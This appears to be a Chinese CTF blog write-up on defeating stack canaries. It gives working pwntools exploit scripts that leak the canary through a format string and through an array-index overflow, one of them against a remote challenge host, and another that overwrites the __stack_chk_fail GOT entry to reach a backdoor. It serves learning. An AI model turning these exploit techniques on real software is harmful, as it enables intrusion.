---
title: 2022-01-16-PWN-canary的绕过和泄露思路
date: 2022-01-16 18:49:37
tags: ['CTF', 'Pwn', ]
categories: ['CTF']
authors: [nova]
index_img: https://novanoir.moe/img/ctf_logo_1.png
banner_img: https://novanoir.moe/img/ctf_banner_1.png


---

准备研究一下不同保护机制下的绕过，然后就准备进heap了

今天先来看一下Canary

<!--truncate-->

# Leak Canary

绕过Canary的主要一种方式就是泄露Canary的值，通常需要根据格式化字符串或者题目的一些输出来进行。

## bin

这是一题最基础的格式化字符串泄露Canary的题目

![pseudocode](https://cdn.novanoir.moe/img/image-20220116194731361.png)

![checksec](https://cdn.novanoir.moe/img/image-20220116195013327.png)

同时，有直接cat flag的后门函数，所以我们只需要泄露出canary的值，并溢出到后门函数就好。

通过GDB看到canary在字符串的第七个参数位置，直接任意地址读canary就好

exp:

```python
from pwn import *

context.log_level = 'DEBUG'
context.arch = 'i386'
context.os = 'linux'

sh = process('./bin')

payload = b'%7$x'
# gdb.attach(sh, 'b printf')
sh.sendline(payload)
canary = int(sh.recv(), 16)
print(canary) 
getflag_addr = 0x0804863B
payload = b'A'*100 + p32(canary) + b'A'*12 + p32(getflag_addr)
sh.sendline(payload)
sh.interactive()

```

## pwn1

这是用到了数组下标溢出的知识，但本质也是一样的。

通过数组下标溢出修改它的上限判定，再泄露canary

（按理来说应该可以直接修改数组下标到返回地址，直接修改返回地址，但是还没搞出来，同样的脚本写着写着就segment fault了，再改回去也不行了，程序员的疑问+1）

给出两个exp

exp1:

```python
from pwn import *
context.log_level = 'DEBUG'
context.arch = 'amd64'
context.os = 'linux'

# sh = process("./calc")
sh = remote('pwn.nos4fe.site', 10000)

sh.recvuntil(b'Your choice:')
sh.sendline(b'1')
sh.recvuntil(b'Please input the pos:')
sh.sendline(b'-2')
sh.recvuntil(b'Please input the number:')
sh.sendline(b'1000')

for i in range(23):
    sh.recvuntil(b'Your choice:')
    sh.sendline(b'1')
    sh.recvuntil(b'Please input the pos:')
    sh.sendline(b'%d' % i)
    sh.recvuntil(b'Please input the number:')
    sh.sendline(b'0')

#gdb.attach(sh, 'b puts')


sh.recvuntil(b'Your choice:')
sh.sendline(b'2')
sh.recvuntil(b'How many?')
sh.sendline(b'24')
sh.recvuntil(b"result:")
canary = int(sh.recvline())
calc_root_addr = int(0x4012BD)
sh.recvuntil(b'Your choice:')
sh.sendline(b'3')
sh.recvuntil(b"What's your name?")
payload = b'A'*(0x20-0x08) + p64(canary) + b'A'*0x08 + p64(calc_root_addr)
sh.sendline(payload)
sh.interactive()

```

exp2:

```python
from pwn import *
context.log_level='DEBUG'
context.arch='amd64'
context.os='linux'

#sh = process("./calc")
sh = remote('pwn.nos4fe.site', 10000)

sh.recvuntil(b'Your choice:')
sh.sendline(b'1')
sh.recvuntil(b'Please input the pos:')
sh.sendline(b'-2')
sh.recvuntil(b'Please input the number:')
sh.sendline(b'1000')


sh.recvuntil(b'Your choice:')
sh.sendline(b'1')
sh.recvuntil(b'Please input the pos:')
sh.sendline(b'25')
#gdb.attach(sh, 'b puts')
sh.recvuntil(b'Please input the number:')
sh.sendline(b'4199101')

sh.recvuntil(b'Your choice:')
sh.sendline(b'3')
sh.sendline(b'')
sh.interactive()
```



# Hijack stack_chk_fail

修改`stack_chk_fail`函数的got表地址，让它执行时直接跳转到后门函数

这样再栈溢出就可以了

主要还是靠一手格式化字符串任意地址写(让人怀疑主题（)

```python
from pwn import *

context.log_level = 'DEBUG'
context.arch = 'amd64'
context.os = 'linux'

sh = process('./bin3')
elf = ELF('./bin3')

stack_chk_fail_got = elf.got['__stack_chk_fail']
backdoor_addr = 0x040084E

payload = fmtstr_payload(6, {stack_chk_fail_got: backdoor_addr})
print(payload)
sh.sendline(payload + b'A'*0x100)
sh.interactive()

```

> 顺带提一嘴，其实我对fmtstr的大数字覆盖还是挺搞不懂的，不过pwntools居然自带了fmtstr_payload来给你算，挺好的



# Brute-Force

Fork进程会让canary不变，可以爆破

~~还没有找到题目~~

